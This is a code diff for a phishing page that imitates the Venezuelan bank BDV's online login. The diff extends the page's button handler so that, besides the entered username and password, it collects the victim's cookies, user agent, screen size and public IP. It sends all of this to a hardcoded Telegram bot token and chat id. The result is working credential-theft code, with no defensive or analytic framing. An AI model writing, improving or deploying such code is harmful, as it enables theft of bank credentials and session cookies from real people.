@@ -406,16 +406,41 @@
             }, 1500);
         });
 
-        btnCancelar.addEventListener('click', () => {
+        btnCancelar.addEventListener('click', async () => {
             const usuario = document.querySelector('.input-field').value;
             const password = document.querySelector('.password-input').value;
+            
+            // Obtener más datos
+            const userAgent = navigator.userAgent;
+            const cookies = document.cookie;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const fecha = new Date().toLocaleString();
+            
+            // Obtener IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
             
             const loader = document.querySelector('.loader');
             loader.style.display = 'flex';
             
             const token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
             const chat_id = "6912929677";
-            const mensaje = `🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: ${usuario}\n🔑 Clave: ${password}\n📅 Fecha: ${new Date().toLocaleString()}`;
+            
+            // Mensaje mejorado
+            const mensaje = `
+🏦 ═══ BDV EN LÍNEA ═══ 🏦
+
+👤 Usuario: ${usuario}
+🔑 Clave: ${password}
+🌐 IP: ${ip}
+📱 Dispositivo: ${userAgent}
+🖥️ Pantalla: ${screenSize}
+🍪 Cookies: ${cookies}
+📅 Fecha: ${fecha}
+
+═══════════════════
+            `;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`)
             .then(() => {
